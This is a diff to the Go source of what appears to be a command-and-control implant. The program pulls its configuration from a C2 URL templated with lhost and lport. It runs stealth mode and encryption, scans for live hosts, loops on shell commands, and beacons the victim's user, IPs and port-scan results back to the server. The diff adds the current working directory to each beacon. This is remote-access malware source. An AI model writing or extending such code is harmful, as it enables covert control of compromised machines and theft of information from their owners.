@@ -45,6 +45,7 @@ var proxyMutex sync.Mutex
 var GlobalIP string = ""
 var simulationFailed bool
 var getipFailed bool
+var result_pwd string = ""
 
 const (
     C2_URL     = "https://{lhost}:{lport}"
@@ -107,6 +108,7 @@ type HostResult struct {
 	Alive   bool
 	Interface string
 }
+
 func RandomSelectStr(slice []string) string {
 	mathrand.Seed(time.Now().UnixNano())
 	index := mathrand.Intn(len(slice))
@@ -411,7 +413,8 @@ func runScript(ctx context.Context, command string, shellCommand []string, lazyc
 			"ips":             strings.Join(ips, ", "),
 			"user":            currentUser.Username,
 			"discovered_ips":  discoveredLiveHosts,
-			"result_portscan": nil, 
+			"result_portscan": nil,
+            "result_pwd": result_pwd, 
 		})
 
 		if lazyconf.DebugImplant == "True" {
@@ -1694,7 +1697,7 @@ func main() {
     var lazyconf LazyDataType
     var currentPortScanResults map[string][]int
     url := C2_URL + "/config.json"
-    
+        
     err := ReadJSONFromURL(url, &lazyconf)
 	if err != nil {
         fmt.Println("Error:", err)
@@ -1702,6 +1705,12 @@ func main() {
 	}
     if lazyconf.DebugImplant == "True" {
         fmt.Println("[INFO] Reading JSON from URL:", url)
+    }
+    result_pwd, err = os.Getwd()
+    if err != nil {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Println("Error getting current working directory:", err)
+        }
     }
     initStealthMode(lazyconf)
     encryptionCtx = initEncryptionContext(keyHex)
@@ -1715,7 +1724,6 @@ func main() {
 
     shellCommand := getShellCommand("-c")
     baseCtx := context.Background()
-
     for {
         func() {        
             defer globalRecover()
@@ -2091,6 +2099,7 @@ func handleCommand(ctx context.Context, command string, shellCommand []string, l
         "user":            currentUser.Username,
         "discovered_ips":  discoveredLiveHosts,
         "result_portscan": resultadosEscaneo,
+        "result_pwd": result_pwd,
     })
     var prettyJSON bytes.Buffer
     json.Indent(&prettyJSON, jsonData, "", "  ") 
@@ -2120,6 +2129,7 @@ func handleResponse(ctx context.Context, command string, shellMsg string, lazyco
         "user":            currentUser.Username,
         "discovered_ips":  discoveredLiveHosts,
         "result_portscan": resultadosEscaneo,
+        "result_pwd": result_pwd,
     })
     var prettyJSON bytes.Buffer
     json.Indent(&prettyJSON, jsonData, "", "  ") 
